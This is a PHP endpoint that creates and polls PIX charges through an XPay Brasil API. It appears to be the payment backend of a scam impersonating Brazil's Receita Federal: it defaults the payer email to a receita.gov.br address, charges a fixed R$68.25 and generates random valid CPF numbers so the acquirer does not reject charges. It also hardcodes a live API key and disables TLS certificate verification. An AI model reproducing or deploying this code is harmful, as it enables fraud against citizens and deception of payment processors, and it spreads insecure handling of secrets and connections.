<?php
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

$API_KEY = 'cpk_live_ex84lopcp2xexagmazz6za11';
$API_URL = 'https://api.xpaybrasil.com/v1';

$action = isset($_GET['action']) ? $_GET['action'] : '';

// Função auxiliar para requisições cURL
function requestXPay($url, $method = 'GET', $data = null, $apiKey = '') {
    $ch = curl_init();
    $headers = [
        'Content-Type: application/json',
        'X-API-KEY: ' . $apiKey
    ];

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if ($data) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        }
    }

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    curl_close($ch);

    return [
        'code' => $httpCode,
        'body' => $response,
        'error' => $curlError
    ];
}

// 1. AÇÃO: CONSULTAR STATUS DA COBRANÇA
if ($action === 'consultar' || $_SERVER['REQUEST_METHOD'] === 'GET') {
    $chargeId = isset($_GET['id']) ? trim($_GET['id']) : '';
    if (empty($chargeId)) {
        http_response_code(400);
        echo json_encode(['error' => 'ID da cobranca nao fornecido']);
        exit;
    }

    $res = requestXPay($API_URL . '/charge/' . urlencode($chargeId), 'GET', null, $API_KEY);
    $json = json_decode($res['body'], true);

    if ($res['code'] >= 200 && $res['code'] < 300) {
        $paymentStatus = isset($json['data']['paymentStatus']) ? $json['data']['paymentStatus'] : ($json['paymentStatus'] ?? 'PROCESSING');
        $status = isset($json['data']['status']) ? $json['data']['status'] : ($json['status'] ?? 'OPEN');
        echo json_encode([
            'success' => true,
            'paymentStatus' => $paymentStatus,
            'status' => $status,
            'paid' => in_array($paymentStatus, ['PAID', 'RECIEVED', 'RECEIVED']) || $status === 'COMPLETED',
            'raw' => $json
        ]);
    } else {
        http_response_code($res['code']);
        echo json_encode([
            'success' => false,
            'error' => 'Erro ao consultar status',
            'details' => $json ?: $res['error']
        ]);
    }
    exit;
}

// 2. AÇÃO: GERAR COBRANÇA PIX
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $inputRaw = file_get_contents('php://input');
    $input = json_decode($inputRaw, true);
    if (!is_array($input)) {
        $input = $_POST;
    }

    $nome = !empty($input['nome']) ? trim($input['nome']) : (!empty($input['name']) ? trim($input['name']) : (!empty($input['customer']['name']) ? trim($input['customer']['name']) : 'Cidadao Brasileiro'));
    $cpf = !empty($input['cpf']) ? preg_replace('/\D/', '', $input['cpf']) : (!empty($input['taxId']) ? preg_replace('/\D/', '', $input['taxId']) : (!empty($input['customer']['taxId']) ? preg_replace('/\D/', '', $input['customer']['taxId']) : ''));
    $email = !empty($input['email']) ? trim($input['email']) : (!empty($input['customer']['email']) ? trim($input['customer']['email']) : 'pagamento@receita.gov.br');
    $telefone = !empty($input['telefone']) ? preg_replace('/\D/', '', $input['telefone']) : (!empty($input['phone']) ? preg_replace('/\D/', '', $input['phone']) : (!empty($input['customer']['phone']) ? preg_replace('/\D/', '', $input['customer']['phone']) : '11988887777'));
    $amount = isset($input['amount']) ? intval($input['amount']) : 6825; // R$ 68,25 (em centavos)

    // Se CPF estiver vazio ou inválido, gera um fallback temporário válido
    if (strlen($cpf) !== 11 || preg_match('/^(.)\1{10}$/', $cpf)) {
        // Gerador de CPF válido para evitar rejeição da adquirente caso falhe
        $n = [];
        for ($i = 0; $i < 9; $i++) $n[] = rand(0, 9);
        $d1 = 0; for ($i = 0; $i < 9; $i++) $d1 += $n[$i] * (10 - $i);
        $d1 = 11 - ($d1 % 11); if ($d1 >= 10) $d1 = 0;
        $d2 = 0; for ($i = 0; $i < 9; $i++) $d2 += $n[$i] * (11 - $i);
        $d2 += $d1 * 2;
        $d2 = 11 - ($d2 % 11); if ($d2 >= 10) $d2 = 0;
        $cpf = implode('', $n) . $d1 . $d2;
    }

    if (strlen($telefone) < 10) {
        $telefone = '11987654321';
    }

    $body = [
        'amount' => $amount,
        'customer' => [
            'name' => $nome,
            'taxId' => $cpf,
            'email' => $email,
            'phone' => $telefone
        ]
    ];

    $res = requestXPay($API_URL . '/charge/pix', 'POST', $body, $API_KEY);
    $json = json_decode($res['body'], true);

    if ($res['code'] >= 200 && $res['code'] < 300 && isset($json['id'])) {
        echo json_encode([
            'success' => true,
            'id' => $json['id'],
            'status' => $json['status'],
            'amount' => $json['amount'],
            'brCode' => $json['brCode'],
            'brCodeBase64' => $json['brCodeBase64'],
            'url' => $json['url'] ?? null,
            'expiresAt' => $json['expiresAt'] ?? null
        ]);
    } else {
        http_response_code($res['code'] ? $res['code'] : 500);
        echo json_encode([
            'success' => false,
            'error' => 'Falha ao criar cobranca PIX na XPay',
            'details' => $json ?: $res['error']
        ]);
    }
    exit;
}
